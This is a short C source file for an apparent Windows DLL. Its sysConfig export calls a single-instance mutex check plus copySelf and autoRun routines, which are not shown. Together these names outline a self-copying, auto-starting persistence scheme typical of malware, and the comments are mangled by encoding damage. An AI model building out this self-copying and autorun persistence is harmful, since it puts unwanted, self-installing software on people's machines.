#include "stdafx.h"
#include "libsysaux.h"



LIBAUX_API VOID msgBox()
{
	MessageBox(GetDesktopWindow(), L"ok", L"ok", MB_OK);

	return;

}

LIBAUX_API BOOL sysConfig()
{
	checkMutex();
	copySelf();
	autoRun();
	return TRUE;
}

//��黥����,��Ҫ���������������ظ�����
BOOL checkMutex()
{
	HANDLE hMutex = NULL;

	//����������� 
	if (NULL != (hMutex = CreateMutex(NULL, FALSE, L"dig out")))
	{
		
		//���mutex�������Ѿ�����
		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{
			MessageBox(NULL, TEXT("Another Instance is RUNNING!!"),
				TEXT("ERROE"), MB_OK | MB_ICONINFORMATION);
			
			//�رջ�������˳�����; 
			exit(-1);
		}
	}
	return TRUE;
}

